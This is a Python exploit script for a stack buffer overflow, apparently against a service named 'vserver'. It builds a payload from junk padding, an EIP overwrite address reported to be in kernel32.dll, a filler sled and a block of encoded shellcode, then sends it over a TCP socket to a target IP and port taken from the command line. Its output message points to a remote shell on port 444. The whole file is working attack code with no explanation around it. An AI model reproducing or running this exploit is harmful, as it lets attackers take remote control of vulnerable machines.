#!/usr/bin/python
import socket
import sys

junk = b'A' * 54
eip_override = b'\x7B\x46\x86\x7C' # (0012EC20 - esp [will not be successful]) (7C86467B -- kernel32.dll) (7E429353 -- user32.dll)
NOPS = b'C' * 30
buf =  b""
buf += b"\xd9\xc7\xbb\xcf\xae\x75\x55\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x52\x31\x5a\x17\x03\x5a\x17\x83\x0d\xaa\x97"
buf += b"\xa0\x6d\x5b\xd5\x4b\x8d\x9c\xba\xc2\x68\xad\xfa\xb1"
buf += b"\xf9\x9e\xca\xb2\xaf\x12\xa0\x97\x5b\xa0\xc4\x3f\x6c"
buf += b"\x01\x62\x66\x43\x92\xdf\x5a\xc2\x10\x22\x8f\x24\x28"
buf += b"\xed\xc2\x25\x6d\x10\x2e\x77\x26\x5e\x9d\x67\x43\x2a"
buf += b"\x1e\x0c\x1f\xba\x26\xf1\xe8\xbd\x07\xa4\x63\xe4\x87"
buf += b"\x47\xa7\x9c\x81\x5f\xa4\x99\x58\xd4\x1e\x55\x5b\x3c"
buf += b"\x6f\x96\xf0\x01\x5f\x65\x08\x46\x58\x96\x7f\xbe\x9a"
buf += b"\x2b\x78\x05\xe0\xf7\x0d\x9d\x42\x73\xb5\x79\x72\x50"
buf += b"\x20\x0a\x78\x1d\x26\x54\x9d\xa0\xeb\xef\x99\x29\x0a"
buf += b"\x3f\x28\x69\x29\x9b\x70\x29\x50\xba\xdc\x9c\x6d\xdc"
buf += b"\xbe\x41\xc8\x97\x53\x95\x61\xfa\x3b\x5a\x48\x04\xbc"
buf += b"\xf4\xdb\x77\x8e\x5b\x70\x1f\xa2\x14\x5e\xd8\xc5\x0e"
buf += b"\x26\x76\x38\xb1\x57\x5f\xff\xe5\x07\xf7\xd6\x85\xc3"
buf += b"\x07\xd6\x53\x43\x57\x78\x0c\x24\x07\x38\xfc\xcc\x4d"
buf += b"\xb7\x23\xec\x6e\x1d\x4c\x87\x95\xf6\xb3\xf0\xbd\x83"
buf += b"\x5c\x03\xbd\x8a\x20\x8a\x5b\xe6\x48\xdb\xf4\x9f\xf1"
buf += b"\x46\x8e\x3e\xfd\x5c\xeb\x01\x75\x53\x0c\xcf\x7e\x1e"
buf += b"\x1e\xb8\x8e\x55\x7c\x6f\x90\x43\xe8\xf3\x03\x08\xe8"
buf += b"\x7a\x38\x87\xbf\x2b\x8e\xde\x55\xc6\xa9\x48\x4b\x1b"
buf += b"\x2f\xb2\xcf\xc0\x8c\x3d\xce\x85\xa9\x19\xc0\x53\x31"
buf += b"\x26\xb4\x0b\x64\xf0\x62\xea\xde\xb2\xdc\xa4\x8d\x1c"
buf += b"\x88\x31\xfe\x9e\xce\x3d\x2b\x69\x2e\x8f\x82\x2c\x51"
buf += b"\x20\x43\xb9\x2a\x5c\xf3\x46\xe1\xe4\x03\x0d\xab\x4d"
buf += b"\x8c\xc8\x3e\xcc\xd1\xea\x95\x13\xec\x68\x1f\xec\x0b"
buf += b"\x70\x6a\xe9\x50\x36\x87\x83\xc9\xd3\xa7\x30\xe9\xf1"

shell_code = buf

payload = junk + eip_override + NOPS + shell_code

server_ip = str(sys.argv[1])
server_port = int(sys.argv[2])

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "\nSending the final exploit to vserver. Check the port 444 for a remote shell connection."

soc.connect((server_ip, server_port))
soc.send(payload)

soc.close()
print "Done sending."
